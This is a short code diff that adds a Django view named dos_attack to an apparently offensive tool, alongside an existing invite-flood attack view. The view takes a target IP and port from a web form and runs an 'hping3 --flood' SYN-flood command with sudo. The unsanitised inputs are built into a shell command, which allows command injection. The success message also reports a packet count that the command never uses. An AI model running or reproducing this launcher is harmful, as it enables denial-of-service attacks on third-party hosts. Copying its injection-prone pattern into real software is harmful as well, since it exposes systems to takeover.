@@ -82,3 +82,27 @@ def inviteflood_attack(request):
         return render(request, 'attacks/index.html', {'message': message})
 
     return render(request, 'attacks/index.html', {'message': 'Invalid request method.'})
+
+def dos_attack(request):
+    if request.method == "POST":
+        target_ip = request.POST.get('target_ip')
+        target_port = request.POST.get('target_port')
+        packet_count = request.POST.get('packet_count', '1000')
+
+        try:
+            # Command to perform DoS attack using hping3
+            # Install hping3 for this attack
+            command = f"sudo hping3 -S --flood -p {target_port} {target_ip}"
+            result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                message = f'DoS attack simulated successfully on {target_ip}:{target_port} with {packet_count} packets.'
+            else:
+                message = f'Error: {result.stderr}'
+        except Exception as e:
+            message = f'Error running DoS attack: {str(e)}'
+
+        return render(request, 'attacks/index.html', {'message': message})
+
+    return render(request, 'attacks/index.html', {'message': 'Invalid request method.'})
+
